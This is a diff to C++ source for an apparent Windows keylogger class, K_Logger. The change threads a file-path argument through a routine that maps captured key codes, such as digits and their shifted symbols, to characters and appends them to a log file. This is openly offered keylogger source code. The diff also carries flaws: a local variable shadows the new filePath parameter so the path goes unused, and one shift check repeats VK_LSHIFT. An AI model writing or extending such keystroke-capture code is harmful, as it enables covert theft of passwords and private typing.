@@ -1,44 +1,34 @@
 #include "basic_functions.h"
 
-void K_Logger::WriteToDoc(LPCSTR text, WindowsOSPath windows_path)
+void K_Logger::WriteToDoc(LPCSTR text, const string filePath)
 {
 	std::fstream doc_to;
 	string filePath;
-
-	switch (windows_path)
-	{
-	case DOWNLOADS:
-		filePath = "";
-		break;
-
-	default:
-		break;
-	}
 
 	doc_to.open(filePath, fstream::app | fstream::in);
 	doc_to << text;
 	doc_to.close();
 }
 
-int K_Logger::SaveSymbol(WORD iKey)
+int K_Logger::SaveSymbol(WORD iKey, const string filePath)
 {
 	switch (iKey)
 	{
 	case VK_SCROLL:
 		cout << " *SCROLL* ";
-		WriteToDoc(" *SCROLL* ");
+		WriteToDoc(" *SCROLL* ", filePath);
 		break;
 
 	case 48:
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			cout << ")";
-			WriteToDoc(")");
+			WriteToDoc(")", filePath);
 		}
 		else
 		{
 			cout << "0";
-			WriteToDoc("0");
+			WriteToDoc("0", filePath);
 		}
 		break;
 
@@ -46,12 +36,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_LSHIFT))
 		{
 			cout << "!";
-			WriteToDoc("!");
+			WriteToDoc("!", filePath);
 		}
 		else
 		{
 			cout << "1";
-			WriteToDoc("1");
+			WriteToDoc("1", filePath);
 		}
 		break;
 
@@ -59,12 +49,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			std::cout << "@";
-			WriteToDoc("@");
+			WriteToDoc("@", filePath);
 		}
 		else
 		{
 			cout << "2";
-			WriteToDoc("2");
+			WriteToDoc("2", filePath);
 		}
 		break;
 
@@ -72,12 +62,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			cout << "#";
-			WriteToDoc("#");
+			WriteToDoc("#", filePath);
 		}
 		else
 		{
 			cout << "3";
-			WriteToDoc("3");
+			WriteToDoc("3", filePath);
 		}
 		break;
 
@@ -85,12 +75,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			cout << "$";
-			WriteToDoc("$");
+			WriteToDoc("$", filePath);
 		}
 		else
 		{
 			cout << "4";
-			WriteToDoc("4");
+			WriteToDoc("4", filePath);
 		}
 		break;
 
@@ -98,12 +88,12 @@ int K_Logger::SaveSymbol(WORD iKey)
 		if (GetAsyncKeyState(VK_LSHIFT) || GetAsyncKeyState(VK_RSHIFT))
 		{
 			cout << "%";
-			WriteToDoc("%");
+			WriteToDoc("%", filePath);
 		}
 		else
 		{
 			cout << "5";
-			WriteToDoc("5");
+			WriteToDoc("5", filePath);
 		}
 		break;
 
